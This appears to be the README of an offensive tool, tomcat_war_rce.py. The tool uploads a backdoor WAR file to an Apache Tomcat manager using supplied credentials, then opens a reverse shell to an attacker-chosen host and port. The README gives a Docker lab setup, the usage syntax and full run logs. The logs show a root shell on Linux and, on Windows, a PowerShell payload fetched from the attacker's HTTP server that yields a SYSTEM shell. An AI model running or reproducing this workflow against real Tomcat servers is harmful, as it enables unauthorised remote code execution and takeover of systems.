# tomcat_war_rce

## Summary

Gets code execution on a tomcat instance by upload an backdoor war and remove it after
it created a reverse shell.

## Usage

Start docker container with tomcat if you want to test this locally

```sh
tomcat_war_rce  master ⦿ docker-compose build
Building tomcat
Step 1/5 : FROM tomcat:8.0
 ---> b4b762737ed4
Step 2/5 : EXPOSE 8080
 ---> Using cache
 ---> be95c9cd120b
Step 3/5 : RUN apt-get update -y && apt-get install -y --no-install-recommends    python    && rm -rf /var/lib/apt/lists/*
 ---> Using cache
 ---> c3393f40f323
Step 4/5 : COPY tomcat-users.xml /usr/local/tomcat/conf/
 ---> Using cache
 ---> 93f6c7929b4e
Step 5/5 : COPY context.xml /usr/local/tomcat/webapps/manager/META-INF/
 ---> Using cache
 ---> 30398f7d5b39
Successfully built 30398f7d5b39
Successfully tagged tomcatwarrce_tomcat:latest

tomcat_war_rce  master ⦿ docker-compose up -d
Creating network "tomcatwarrce_default" with the default driver
Creating tomcatwarrce_tomcat_1 ... done
```

Verify that container is running.

```sh
tomcat_war_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                 COMMAND             CREATED             STATUS              PORTS                    NAMES
fc0b104d957e        tomcatwarrce_tomcat   "catalina.sh run"   15 seconds ago      Up 14 seconds       0.0.0.0:8080->8080/tcp   tomcatwarrce_tomcat_1
```

Run ./tomcat_war_rce.py to get the usage menu.

```sh
 tomcat_war_rce  master ⦿ ./tomcat_war_rce.py

▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄████▄   ▄▄▄     ▄▄▄█████▓ █     █░ ▄▄▄       ██▀███   ██▀███   ▄████▄  ▓█████
▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██ ░▄█ ▒▒▓█    ▄ ▒███
░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   ░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░      ░ ▒ ▒░ ░  ░      ░  ░  ▒     ▒   ▒▒ ░   ░      ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
░      ░ ░ ░ ▒  ░      ░   ░          ░   ▒    ░        ░   ░    ░   ▒     ░░   ░   ░░   ░ ░           ░
░ ░         ░   ░ ░            ░  ░            ░          ░  ░   ░        ░     ░ ░         ░  ░
░                                                               ░
[mikael.kall@kindredgroup.com]

Usage: ./tomcat_war_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./tomcat_war_rce.py 'http://127.0.0.1:8080' 10.10.14.24 1337 <USERNAME> <PASSWORD>
```        

Run the exploit.

```sh
tomcat_war_rce  master ⦿ ./tomcat_war_rce.py 'http://127.0.0.1:8080' 192.168.1.94 1337 admin password
[+] LHOST = 192.168.1.94
[+] Deploy war
[+] OS:Linux
[+] Shell listen
[+] Exploit
root@fc0b104d957e:/usr/local/tomcat# id
uid=0(root) gid=0(root) groups=0(root)
```

This also works on windows.

```sh
tomcat_war_rce  master ⦿  ./tomcat_war_rce.py 'http://10.10.10.95:8080' 10.10.14.24 1337 tomcat s3cret
[+] LHOST = 10.10.14.24
[+] Deploy war
[+] OS:Windows
[+] HTTP Listen = 8000
[+] Netcat port: 1337
[+] Exploit
10.10.10.95 - - [13/Jul/2018 15:54:11] "GET /shell.ps1 HTTP/1.1" 200 -
Connection from 10.10.10.95:49216
Windows PowerShell running as user JERRY$ on JERRY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\apache-tomcat-7.0.88> whoami
nt authority\system
```